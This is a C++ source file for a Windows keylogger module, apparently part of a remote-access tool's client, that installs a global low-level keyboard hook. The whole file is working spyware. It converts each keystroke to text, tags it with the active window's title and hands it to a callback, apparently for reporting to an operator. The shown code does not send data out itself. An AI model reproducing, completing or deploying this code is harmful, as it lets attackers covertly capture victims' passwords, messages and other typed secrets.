#include "KeyloggerHandler.h"
#include <Windows.h>
#include <iostream>
#include <string>
#include <thread>
#include <atomic>

namespace rslm {
    namespace client {
        namespace messages {

            static std::atomic<bool> g_keylogging(false);
            static HHOOK g_hook = nullptr;
            static KeylogCallback g_callback;
            static std::thread g_keylogThread;

            static std::string GetActiveWindowTitle() {
                char title[256] = {0};
                HWND hwnd = GetForegroundWindow();
                if (hwnd) {
                    GetWindowTextA(hwnd, title, 256);
                }
                return std::string(title);
            }

            static std::string KeyCodeToText(WPARAM wParam, bool isShift) {
                BYTE keyboardState[256] = {0};
                GetKeyboardState(keyboardState);
                if (isShift) keyboardState[VK_SHIFT] = 0x80;

                WCHAR buffer[4] = {0};
                int result = ToUnicode(static_cast<UINT>(wParam), 0, keyboardState, buffer, 4, 0);
                if (result > 0) {
                    char ascii[5] = {0};
                    WideCharToMultiByte(CP_ACP, 0, buffer, -1, ascii, 5, nullptr, nullptr);
                    return std::string(ascii);
                }

                // Handle special keys
                switch (wParam) {
                    case VK_BACK:    return "[Backspace]";
                    case VK_RETURN:  return "[Enter]";
                    case VK_SPACE:   return " ";
                    case VK_TAB:     return "[Tab]";
                    case VK_ESCAPE:  return "[Esc]";
                    case VK_UP:      return "[Up]";
                    case VK_DOWN:    return "[Down]";
                    case VK_LEFT:    return "[Left]";
                    case VK_RIGHT:   return "[Right]";
                    case VK_DELETE:  return "[Delete]";
                    case VK_CAPITAL: return "[CapsLock]";
                    case VK_F1:      return "[F1]";
                    case VK_F2:      return "[F2]";
                    case VK_F3:      return "[F3]";
                    case VK_F4:      return "[F4]";
                    case VK_F5:      return "[F5]";
                    case VK_F6:      return "[F6]";
                    case VK_F7:      return "[F7]";
                    case VK_F8:      return "[F8]";
                    case VK_F9:      return "[F9]";
                    case VK_F10:     return "[F10]";
                    case VK_F11:     return "[F11]";
                    case VK_F12:     return "[F12]";
                    default:         return "";
                }
            }

            static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                if (nCode >= 0 && g_keylogging && g_callback) {
                    if (!(lParam & 0x80000000)) { // Only keydown
                        bool isShift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
                        std::string text = KeyCodeToText(wParam, isShift);
                        if (!text.empty()) {
                            g_callback(GetActiveWindowTitle(), text);
                        }
                    }
                }
                return CallNextHookEx(g_hook, nCode, wParam, lParam);
            }

            static void KeyloggerThread() {
                g_hook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(nullptr), 0);
                if (!g_hook) return;

                MSG msg;
                while (GetMessage(&msg, nullptr, 0, 0) && g_keylogging) {
                    TranslateMessage(&msg);
                    DispatchMessage(&msg);
                }

                UnhookWindowsHookEx(g_hook);
                g_hook = nullptr;
            }

            void KeyloggerHandler::Start(KeylogCallback onKeylog) {
                if (g_keylogging) return;
                
                g_callback = std::move(onKeylog);
                g_keylogging = true;
                
                g_keylogThread = std::thread(KeyloggerThread);
            }

            void KeyloggerHandler::Stop() {
                g_keylogging = false;
                
                if (g_hook) {
                    PostQuitMessage(0);
                }
                
                if (g_keylogThread.joinable()) {
                    g_keylogThread.join();
                }
            }

            bool KeyloggerHandler::IsRunning() {
                return g_keylogging;
            }

        } // namespace messages
    } // namespace client
} // namespace rslm
